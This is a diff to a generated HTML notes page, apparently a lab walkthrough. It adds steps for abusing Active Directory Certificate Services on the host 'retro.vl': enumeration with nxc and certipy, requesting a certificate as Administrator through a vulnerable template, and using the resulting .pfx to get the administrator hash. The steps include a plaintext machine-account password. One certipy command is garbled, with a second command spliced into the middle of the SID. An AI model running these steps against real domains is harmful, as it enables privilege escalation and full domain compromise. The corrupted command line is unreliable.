@@ -665,6 +665,42 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#see-if-acds-is-enabled" class="md-nav__link">
+    <span class="md-ellipsis">
+      See if ACDS is enabled
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#review-acds-for-misconfigurations-review-vulnerabiliteis-section-at-the-bottom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Review ACDS for misconfigurations. Review Vulnerabiliteis section at the bottom
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#request-admin-cert-note-the-sid-used-here-is-for-administrator-account-this-will-generate-pfx" class="md-nav__link">
+    <span class="md-ellipsis">
+      Request Admin Cert Note the SID used here is for Administrator account. This will generate .pfx
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#use-pfx-to-get-hash-connections-could-be-made-with-evilwin-rm-or-brrute-forcing-could-take-place-once-the-hash-is-gathered" class="md-nav__link">
+    <span class="md-ellipsis">
+      Use .PFX to get hash. Connections could be made with evilwin-rm or brrute forcing could take place once the hash is gathered.
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -952,6 +988,42 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#see-if-acds-is-enabled" class="md-nav__link">
+    <span class="md-ellipsis">
+      See if ACDS is enabled
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#review-acds-for-misconfigurations-review-vulnerabiliteis-section-at-the-bottom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Review ACDS for misconfigurations. Review Vulnerabiliteis section at the bottom
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#request-admin-cert-note-the-sid-used-here-is-for-administrator-account-this-will-generate-pfx" class="md-nav__link">
+    <span class="md-ellipsis">
+      Request Admin Cert Note the SID used here is for Administrator account. This will generate .pfx
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#use-pfx-to-get-hash-connections-could-be-made-with-evilwin-rm-or-brrute-forcing-could-take-place-once-the-hash-is-gathered" class="md-nav__link">
+    <span class="md-ellipsis">
+      Use .PFX to get hash. Connections could be made with evilwin-rm or brrute forcing could take place once the hash is gathered.
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -980,6 +1052,18 @@ Get-NetGroup &quot;Domain Admins&quot;
 <li>Kerberoasting</li>
 <li>ACL abuse</li>
 </ul>
+<h2 id="see-if-acds-is-enabled">See if ACDS is enabled</h2>
+<pre><code> nxc ldap retro.vl -u &quot;banking$&quot; -p 'pass123!' -M adcs
+</code></pre>
+<h2 id="review-acds-for-misconfigurations-review-vulnerabiliteis-section-at-the-bottom">Review ACDS for misconfigurations.  Review Vulnerabiliteis section at the bottom</h2>
+<pre><code>certipy find -u 'banking$' -p 'pass123!' -dc-ip 10.129.234.44 -vulnerable -stdout
+</code></pre>
+<h2 id="request-admin-cert-note-the-sid-used-here-is-for-administrator-account-this-will-generate-pfx">Request Admin Cert  Note the SID used here is for Administrator account.  This will generate .pfx</h2>
+<pre><code>certipy req -u 'banking$' -p 'pass123!' -dc-ip 10.129.234.44 -ca retro-DC-CA -template RetroClients -upn Administrator -target dc.retro.vl -key-size 4096 -sid S-1-5-21-2983547755-698260136-428391certipy-ad find -u 'banking$' -p 'pass123!' -dc-ip 10.129.234.44 -vulnerable -stdout8172-500
+</code></pre>
+<h2 id="use-pfx-to-get-hash-connections-could-be-made-with-evilwin-rm-or-brrute-forcing-could-take-place-once-the-hash-is-gathered">Use .PFX to get hash.  Connections could be made with evilwin-rm or brrute forcing could take place once the hash is gathered.</h2>
+<pre><code>certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.129.234.44 
+</code></pre>
 
 
 
